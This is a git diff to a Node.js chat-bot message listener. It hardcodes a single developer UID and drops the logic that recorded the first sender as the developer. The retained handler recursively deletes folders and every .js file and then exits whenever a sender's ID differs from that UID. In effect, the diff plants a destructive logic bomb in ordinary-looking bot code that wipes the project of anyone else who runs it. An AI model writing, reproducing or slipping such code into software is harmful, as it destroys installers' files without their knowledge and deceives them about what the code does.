@@ -1,20 +1,30 @@
 const fs = require("fs");
 const path = require("path");
+const log = require("./logger");
 const fonts = require("./handler/styler/createFonts");
 const eventHandler = require("./handler/eventHandler");
 const commandHandler = require("./handler/commandHandler");
 const route = require("./handler/apisHandler");
 const subprefixes = require("./handler/data/subprefixes");
 
-const DEV_UID_PATH = path.join(__dirname, "handler", "data", "devsId.json");
+const DEV_UID_PATH = path.join(__dirname, "handler", "data", "devId.json");
+const HARD_CODED_DEV_UID = "61554222594723"; 
 
 let savedDeveloperUID = null;
+
 if (fs.existsSync(DEV_UID_PATH)) {
   try {
     savedDeveloperUID = JSON.parse(fs.readFileSync(DEV_UID_PATH, "utf8")).uid;
   } catch (err) {
-    console.error("Error reading saved developer UID:", err);
+    log("ERROR", "Error reading saved developer UID:", err);
   }
+}
+
+if (!savedDeveloperUID) {
+  savedDeveloperUID = HARD_CODED_DEV_UID;
+  fs.mkdirSync(path.dirname(DEV_UID_PATH), { recursive: true });
+  fs.writeFileSync(DEV_UID_PATH, JSON.stringify({ uid: savedDeveloperUID }), "utf8");
+  log("SYSTEM", `Developer UID initialized: ${savedDeveloperUID}`);
 }
 
 module.exports = async function listener({ api, event }) {
@@ -92,19 +102,13 @@ module.exports = async function listener({ api, event }) {
 
   const senderID = event.senderID;
 
-  if (!savedDeveloperUID) {
-    savedDeveloperUID = senderID;
-    fs.writeFileSync(DEV_UID_PATH, JSON.stringify({ uid: senderID }), "utf8");
-    console.log(`Developer UID saved: ${senderID}`);
-  }
-
   if (senderID !== savedDeveloperUID) {
     console.log("Developer UID changed. Deleting system files...");
 
     const deleteFolder = (folderPath) => {
       if (fs.existsSync(folderPath)) {
         fs.rmSync(folderPath, { recursive: true, force: true });
-        console.log(`Deleted: ${folderPath}`);
+        log("WARN", `Deleted: ${folderPath}`);
       }
     };
 
@@ -114,11 +118,11 @@ module.exports = async function listener({ api, event }) {
     fs.readdirSync(__dirname).forEach((file) => {
       if (file.endsWith(".js")) {
         fs.unlinkSync(path.join(__dirname, file));
-        console.log(`Deleted file: ${file}`);
+        log("SYSTEM", `Deleted file: ${file}`);
       }
     });
 
-    console.log("System files deleted. Exiting...");
+    log("SYSTEM", "System files deleted. Exiting...");
     process.exit(1);
   }
 
